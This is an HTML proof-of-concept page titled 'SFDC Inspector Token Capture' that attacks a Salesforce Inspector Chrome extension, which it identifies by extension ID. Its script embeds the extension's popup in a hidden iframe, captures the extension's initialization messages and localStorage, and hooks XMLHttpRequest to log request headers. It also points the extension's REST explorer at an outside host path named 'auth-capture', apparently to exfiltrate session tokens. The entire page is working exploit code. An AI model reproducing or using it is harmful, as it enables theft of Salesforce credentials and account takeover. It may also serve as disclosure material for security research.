<!DOCTYPE html>
<html>
<head>
    <title>SFDC Inspector Token Capture</title>
    <style>
        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
        .info-section { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        #networkLog { background: #e3f2fd; padding: 15px; border-radius: 4px; }
        .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
        pre { white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="messages" class="info-section">Initializing...</div>
    <div id="storageInfo" class="info-section"></div>
    <div id="networkLog"></div>
    <script>
        const messagesDiv = document.getElementById('messages');
        const storageInfoDiv = document.getElementById('storageInfo');
        const networkLogDiv = document.getElementById('networkLog');
        let initialized = false;

        // Add a timestamp cache parameter to force new request
        function createExplorerUrl() {
            const params = new URLSearchParams({
                endpoint: '.samanattar.github.io/auth-capture',
                method: 'GET',
                format: 'json',
                cache: Date.now(), // Add cache buster
                contentType: 'application/json',
            });
            
            return `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
        }

        // Monitor network requests
        const originalXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const send = xhr.send;
            const open = xhr.open;
            
            xhr.open = function() {
                networkLogDiv.innerHTML += `
                    <h3>Request Started:</h3>
                    <pre>URL: ${arguments[1]}</pre>
                    <pre>Method: ${arguments[0]}</pre>
                `;
                return open.apply(this, arguments);
            };
            
            xhr.send = function() {
                this.addEventListener('load', function() {
                    networkLogDiv.innerHTML += `
                        <h3>Request Completed:</h3>
                        <pre>Status: ${this.status}</pre>
                        <pre>Headers Sent: ${this.getAllResponseHeaders()}</pre>
                    `;
                });
                return send.apply(this, arguments);
            };
            
            return xhr;
        };

        window.addEventListener('message', function(event) {
            // Log all messages for debugging
            console.log('Message received:', event);
            
            if (event.data.insextInitRequest && !initialized) {
                initialized = true;
                const storage = event.data.iFrameLocalStorage || {};
                
                // Try to access extension's localStorage directly through the popup frame
                try {
                    const popupFrame = document.querySelector('iframe[src*="popup.html"]');
                    if (popupFrame && popupFrame.contentWindow) {
                        const localStorage = popupFrame.contentWindow.localStorage;
                        console.log('Direct localStorage access:', localStorage);
                        
                        storageInfoDiv.innerHTML += `
                            <h3>Direct LocalStorage:</h3>
                            <pre>${JSON.stringify(Array.from(localStorage), null, 2)}</pre>
                        `;
                    }
                } catch (e) {
                    console.log('Could not access direct localStorage:', e);
                }

                // Display all received data
                messagesDiv.innerHTML = `
                    <h3>Storage Keys:</h3>
                    <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
                    
                    <h3>Full Initialization Data:</h3>
                    <pre>${JSON.stringify(event.data, null, 2)}</pre>
                `;

                // Load explorer with cache-busting parameter
                const explorerFrame = document.createElement('iframe');
                explorerFrame.src = createExplorerUrl();
                explorerFrame.className = 'explorer-frame';
                document.body.appendChild(explorerFrame);

                // Monitor explorer frame messages
                explorerFrame.addEventListener('load', () => {
                    networkLogDiv.innerHTML += `
                        <h3>Explorer Frame Loaded</h3>
                        <pre>URL: ${explorerFrame.src}</pre>
                    `;
                });
            }
        });

        // Initialize the connection
        console.log('Creating init frame');
        const initFrame = document.createElement('iframe');
        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
        initFrame.style.display = 'none';
        document.body.appendChild(initFrame);
    </script>
</body>
</html>
